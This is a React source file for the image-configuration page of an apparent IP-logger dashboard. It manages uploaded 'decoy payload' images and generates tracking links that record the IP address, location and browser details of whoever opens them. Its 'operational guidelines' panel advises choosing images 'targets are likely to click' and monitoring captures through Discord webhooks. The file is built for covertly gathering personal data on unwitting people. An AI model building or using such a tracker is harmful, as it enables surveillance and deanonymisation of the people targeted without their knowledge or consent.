import { useState } from "react";
import { useQuery, useMutation } from "@tanstack/react-query";
import Sidebar from "@/components/dashboard/sidebar";
import { Upload, Trash2, Image as ImageIcon, Link2, Copy, ExternalLink, AlertTriangle, CheckCircle, Shield } from "lucide-react";
import { useToast } from "@/hooks/use-toast";
import { queryClient } from "@/lib/queryClient";
import { useLocation } from "wouter";

interface SettingsData {
  webhookUrl: string | null;
  uploadedImageName: string | null;
  hasUploadedImage: boolean;
  trackingId: string;
}

const CY = {
  font: "Orbitron, sans-serif",
  mono: "JetBrains Mono, monospace",
  cyan: "#00f5ff",
  green: "#00ff9f",
  red: "#ff5050",
  yellow: "#ffc800",
  purple: "#a050ff",
};

function Panel({ title, icon: Icon, color = CY.cyan, children, extra }: any) {
  return (
    <div style={{ background: "rgba(0,6,12,0.7)", border: `1px solid ${color}25` }}>
      <div className="px-5 py-4 border-b flex items-center gap-2"
        style={{ borderColor: `${color}18`, background: "rgba(0,8,20,0.6)" }}>
        <Icon className="w-4 h-4" style={{ color, filter: `drop-shadow(0 0 4px ${color})` }} />
        <span className="text-[11px] font-bold tracking-widest flex-1"
          style={{ fontFamily: CY.font, color, letterSpacing: "0.2em" }}>
          {title}
        </span>
        {extra}
      </div>
      <div className="p-5">{children}</div>
    </div>
  );
}

function CyberBtn({ children, onClick, disabled, variant = "primary", small }: any) {
  const v: Record<string, any> = {
    primary: { bg: "rgba(0,245,255,0.1)",  border: "rgba(0,245,255,0.4)",  color: "#00f5ff" },
    success: { bg: "rgba(0,255,159,0.08)", border: "rgba(0,255,159,0.4)",  color: "#00ff9f" },
    danger:  { bg: "rgba(255,50,50,0.08)", border: "rgba(255,80,80,0.4)",  color: "#ff5050" },
    warning: { bg: "rgba(255,200,0,0.08)", border: "rgba(255,200,0,0.4)",  color: "#ffc800" },
    ghost:   { bg: "transparent",          border: "rgba(0,245,255,0.15)", color: "rgba(0,245,255,0.5)" },
  };
  const s = v[variant] || v.primary;
  return (
    <button onClick={onClick} disabled={disabled}
      className={`flex items-center gap-1.5 ${small ? "px-2.5 py-1 text-[9px]" : "px-4 py-2.5 text-[10px]"} font-bold tracking-widest transition-all hover:scale-105 disabled:opacity-50 disabled:cursor-not-allowed`}
      style={{ background: s.bg, border: `1px solid ${s.border}`, color: s.color, fontFamily: CY.font, letterSpacing: "0.15em", cursor: disabled ? "not-allowed" : "pointer" }}>
      {children}
    </button>
  );
}

export default function ImageConfig() {
  const { toast } = useToast();
  const [dragOver, setDragOver] = useState(false);
  const [, setLocation] = useLocation();

  const { data: settings, isLoading } = useQuery<SettingsData>({ queryKey: ["/api/settings"] });

  const uploadMutation = useMutation({
    mutationFn: async (file: File) => {
      const formData = new FormData();
      formData.append("image", file);
      const token = localStorage.getItem("token");
      if (!token) throw new Error("No authentication token found");
      const res = await fetch("/api/upload-image", {
        method: "POST",
        headers: { Authorization: `Bearer ${token}` },
        body: formData,
      });
      if (!res.ok) throw new Error("Failed to upload image");
      return res.json();
    },
    onSuccess: (data) => {
      toast({ title: "IMAGE UPLOADED", description: `${data.filename} is now active` });
      queryClient.invalidateQueries({ queryKey: ["/api/settings"] });
    },
    onError: () => toast({ title: "UPLOAD FAILED", variant: "destructive" }),
  });

  const deleteMutation = useMutation({
    mutationFn: async () => {
      const token = localStorage.getItem("token");
      const res = await fetch("/api/upload-image", { method: "DELETE", headers: { Authorization: `Bearer ${token}` } });
      if (!res.ok) throw new Error("Failed to delete image");
      return res.json();
    },
    onSuccess: () => { toast({ title: "IMAGE DELETED" }); queryClient.invalidateQueries({ queryKey: ["/api/settings"] }); },
    onError: () => toast({ title: "DELETE FAILED", variant: "destructive" }),
  });

  const handleFileUpload = (file: File) => {
    if (!file.type.startsWith("image/")) { toast({ title: "INVALID FILE", description: "Select an image file", variant: "destructive" }); return; }
    uploadMutation.mutate(file);
  };

  const handleDrop = (e: React.DragEvent) => {
    e.preventDefault(); setDragOver(false);
    const files = Array.from(e.dataTransfer.files);
    if (files.length > 0) handleFileUpload(files[0]);
  };

  const handleFileSelect = (e: React.ChangeEvent<HTMLInputElement>) => {
    const files = Array.from(e.target.files || []);
    if (files.length > 0) handleFileUpload(files[0]);
  };

  const trackingUrl = `${window.location.origin}/raw/image.jpg?tid=${settings?.trackingId}`;

  const copyTrackingUrl = () => {
    navigator.clipboard.writeText(trackingUrl);
    toast({ title: "TRACKING URL COPIED" });
  };

  return (
    <div className="flex h-screen overflow-hidden relative" style={{ background: "#000508" }}>
      {/* Scan lines */}
      <div className="fixed inset-0 pointer-events-none z-0 opacity-[0.015]"
        style={{ backgroundImage: "repeating-linear-gradient(0deg,#00f5ff 0px,#00f5ff 1px,transparent 1px,transparent 4px)" }} />
      <div className="fixed bottom-0 right-0 w-96 h-64 pointer-events-none z-0 opacity-10"
        style={{ background: "radial-gradient(circle at bottom right, rgba(0,255,159,0.3), transparent 70%)" }} />

      <Sidebar />

      <main className="flex-1 overflow-auto relative z-10 pb-16 md:pb-0" style={{ minWidth: 0 }}>
        {/* Header */}
        <header className="sticky top-0 z-20 px-4 md:px-6 py-4 border-b"
          style={{ background: "rgba(0,4,12,0.97)", borderColor: "rgba(0,245,255,0.12)", backdropFilter: "blur(20px)" }}>
          <div className="absolute top-0 left-0 right-0 h-px"
            style={{ background: "linear-gradient(90deg, transparent, rgba(0,245,255,0.5) 30%, rgba(0,255,159,0.5) 70%, transparent)" }} />
          <div className="flex items-center gap-3">
            <ImageIcon className="w-4 h-4" style={{ color: CY.cyan, filter: "drop-shadow(0 0 6px rgba(0,245,255,0.8))" }} />
            <div>
              <h1 className="text-base md:text-lg font-black tracking-widest"
                style={{ fontFamily: CY.font, color: CY.cyan, textShadow: "0 0 15px rgba(0,245,255,0.5)", letterSpacing: "0.2em" }}>
                IMAGE CONFIG
              </h1>
              <p className="text-[10px] tracking-widest" style={{ color: "rgba(0,245,255,0.4)", fontFamily: CY.mono }}>
                // DECOY PAYLOAD MANAGEMENT — TRACKING INFRASTRUCTURE
              </p>
            </div>
          </div>
        </header>

        <div className="p-4 md:p-6 space-y-4 max-w-3xl">
          {isLoading ? (
            <div className="flex items-center justify-center py-20">
              <div className="w-8 h-8 border-2 animate-spin" style={{ borderColor: "rgba(0,245,255,0.1)", borderTopColor: CY.cyan }} />
            </div>
          ) : (
            <>
              {/* Current Image Status */}
              <Panel title="DECOY PAYLOAD STATUS" icon={ImageIcon} color={CY.cyan}>
                {settings?.hasUploadedImage ? (
                  <div className="space-y-4">
                    <div className="flex items-center justify-between p-3"
                      style={{ background: "rgba(0,255,159,0.06)", border: "1px solid rgba(0,255,159,0.25)" }}>
                      <div className="flex items-center gap-3">
                        <div className="w-8 h-8 flex items-center justify-center"
                          style={{ background: "rgba(0,255,159,0.12)", border: "1px solid rgba(0,255,159,0.3)" }}>
                          <CheckCircle className="w-4 h-4" style={{ color: CY.green }} />
                        </div>
                        <div>
                          <div className="text-[11px] font-bold" style={{ color: CY.green, fontFamily: CY.font, letterSpacing: "0.1em" }}>
                            CUSTOM IMAGE ACTIVE
                          </div>
                          <div className="text-[10px] mt-0.5" style={{ color: "rgba(0,255,159,0.6)", fontFamily: CY.mono }}>
                            {settings.uploadedImageName}
                          </div>
                        </div>
                      </div>
                      <CyberBtn small variant="danger" onClick={() => deleteMutation.mutate()} disabled={deleteMutation.isPending}>
                        <Trash2 className="w-3 h-3" />
                        {deleteMutation.isPending ? "DELETING..." : "DELETE"}
                      </CyberBtn>
                    </div>

                    {/* Preview */}
                    <div>
                      <div className="flex items-center justify-between mb-2">
                        <span className="text-[9px] tracking-widest uppercase" style={{ color: "rgba(0,245,255,0.4)", fontFamily: CY.font, letterSpacing: "0.2em" }}>
                          LIVE PREVIEW
                        </span>
                        <CyberBtn small variant="ghost" onClick={() => window.open(trackingUrl, "_blank")}>
                          <ExternalLink className="w-3 h-3" />
                          VIEW IMAGE
                        </CyberBtn>
                      </div>
                      <div className="p-3" style={{ background: "rgba(0,0,0,0.4)", border: "1px solid rgba(0,245,255,0.1)" }}>
                        <img
                          src={`${window.location.origin}/raw/image.jpg?tid=${settings?.trackingId}&t=${Date.now()}`}
                          alt="Tracking image preview"
                          className="max-w-xs mx-auto"
                          style={{ imageRendering: "pixelated" }}
                          onError={(e) => { (e.target as HTMLImageElement).style.display = "none"; }}
                        />
                      </div>
                    </div>
                  </div>
                ) : (
                  <div className="flex items-center gap-3 p-3"
                    style={{ background: "rgba(255,200,0,0.06)", border: "1px solid rgba(255,200,0,0.2)" }}>
                    <AlertTriangle className="w-4 h-4 flex-shrink-0" style={{ color: CY.yellow }} />
                    <div>
                      <div className="text-[11px] font-bold" style={{ color: CY.yellow, fontFamily: CY.font, letterSpacing: "0.1em" }}>
                        DEFAULT PIXEL ACTIVE
                      </div>
                      <div className="text-[10px] mt-0.5" style={{ color: "rgba(255,200,0,0.6)", fontFamily: CY.mono }}>
                        1x1 transparent GIF will be served to visitors
                      </div>
                    </div>
                  </div>
                )}
              </Panel>

              {/* Tracking Link */}
              {settings?.hasUploadedImage && (
                <Panel title="TRACKING URL GENERATOR" icon={Link2} color={CY.purple}>
                  <div className="space-y-3">
                    <p className="text-[11px]" style={{ color: "rgba(200,240,255,0.6)", fontFamily: "Rajdhani, sans-serif" }}>
                      When someone accesses this URL, you'll capture their IP address, location, and browser information.
                    </p>
                    <div className="flex items-center gap-2 p-3"
                      style={{ background: "rgba(0,0,0,0.4)", border: "1px solid rgba(160,80,255,0.25)" }}>
                      <code className="flex-1 text-[11px] break-all" style={{ color: CY.purple, fontFamily: CY.mono }}>
                        {trackingUrl}
                      </code>
                      <button onClick={copyTrackingUrl}
                        className="flex-shrink-0 p-1.5 transition-all hover:scale-110"
                        style={{ background: "rgba(160,80,255,0.12)", border: "1px solid rgba(160,80,255,0.35)", cursor: "pointer" }}>
                        <Copy className="w-3.5 h-3.5" style={{ color: CY.purple }} />
                      </button>
                      <button onClick={() => window.open(trackingUrl, "_blank")}
                        className="flex-shrink-0 p-1.5 transition-all hover:scale-110"
                        style={{ background: "rgba(0,245,255,0.08)", border: "1px solid rgba(0,245,255,0.2)", cursor: "pointer" }}>
                        <ExternalLink className="w-3.5 h-3.5" style={{ color: CY.cyan }} />
                      </button>
                    </div>
                    <div className="text-[10px]" style={{ color: "rgba(160,80,255,0.6)", fontFamily: CY.mono }}>
                      // Test the link yourself first to verify it works correctly
                    </div>
                  </div>
                </Panel>
              )}

              {/* Upload */}
              <Panel title="UPLOAD NEW PAYLOAD" icon={Upload} color={CY.yellow}>
                <div
                  className="border-2 border-dashed p-10 text-center transition-all cursor-pointer"
                  style={{
                    borderColor: dragOver ? CY.yellow : "rgba(255,200,0,0.2)",
                    background: dragOver ? "rgba(255,200,0,0.06)" : "rgba(0,0,0,0.2)",
                    boxShadow: dragOver ? `0 0 20px rgba(255,200,0,0.1)` : "none",
                  }}
                  onDrop={handleDrop}
                  onDragOver={e => { e.preventDefault(); setDragOver(true); }}
                  onDragLeave={() => setDragOver(false)}
                >
                  <Upload className="w-10 h-10 mx-auto mb-3" style={{ color: dragOver ? CY.yellow : "rgba(255,200,0,0.3)", filter: dragOver ? `drop-shadow(0 0 8px ${CY.yellow})` : "none" }} />
                  <div className="text-[11px] font-bold tracking-widest mb-1"
                    style={{ color: dragOver ? CY.yellow : "rgba(255,200,0,0.5)", fontFamily: CY.font, letterSpacing: "0.15em" }}>
                    {uploadMutation.isPending ? "UPLOADING..." : "DROP IMAGE HERE"}
                  </div>
                  <div className="text-[10px] mb-4" style={{ color: "rgba(0,245,255,0.3)", fontFamily: CY.mono }}>
                    or click to select file
                  </div>
                  <input type="file" accept="image/*" onChange={handleFileSelect} className="hidden" id="image-upload" data-testid="input-image-upload" />
                  <label htmlFor="image-upload"
                    className="inline-flex items-center gap-2 px-4 py-2 text-[10px] font-bold tracking-widest cursor-pointer transition-all hover:scale-105"
                    style={{ background: "rgba(255,200,0,0.1)", border: "1px solid rgba(255,200,0,0.4)", color: CY.yellow, fontFamily: CY.font, letterSpacing: "0.15em" }}>
                    <Upload className="w-3 h-3" />
                    SELECT IMAGE
                  </label>
                  <div className="text-[9px] mt-3" style={{ color: "rgba(0,245,255,0.25)", fontFamily: CY.mono }}>
                    No size limit • JPG, PNG, GIF, WebP supported
                  </div>
                </div>
              </Panel>

              {/* Best practices */}
              <Panel title="OPERATIONAL GUIDELINES" icon={Shield} color={CY.green}>
                <div className="space-y-3">
                  {[
                    { title: "Choose Compelling Images", desc: "Use images targets are likely to click (memes, interesting photos, etc.)" },
                    { title: "Test Before Deploying", desc: "Always test your tracking link to ensure it loads and captures data correctly" },
                    { title: "Monitor Results Live", desc: "Check Log Entries and Discord webhooks for real-time tracking results" },
                  ].map((item, i) => (
                    <div key={i} className="flex items-start gap-3 p-3"
                      style={{ background: "rgba(0,255,159,0.04)", border: "1px solid rgba(0,255,159,0.1)" }}>
                      <span className="w-5 h-5 flex items-center justify-center flex-shrink-0 text-[9px] font-black"
                        style={{ background: "rgba(0,255,159,0.12)", border: "1px solid rgba(0,255,159,0.35)", color: CY.green, fontFamily: CY.font }}>
                        {i + 1}
                      </span>
                      <div>
                        <div className="text-[10px] font-bold mb-0.5" style={{ color: CY.green, fontFamily: CY.font, letterSpacing: "0.1em" }}>
                          {item.title.toUpperCase()}
                        </div>
                        <div className="text-[10px]" style={{ color: "rgba(200,240,255,0.55)", fontFamily: "Rajdhani, sans-serif" }}>
                          {item.desc}
                        </div>
                      </div>
                    </div>
                  ))}
                </div>
              </Panel>
            </>
          )}
        </div>
      </main>
    </div>
  );
}
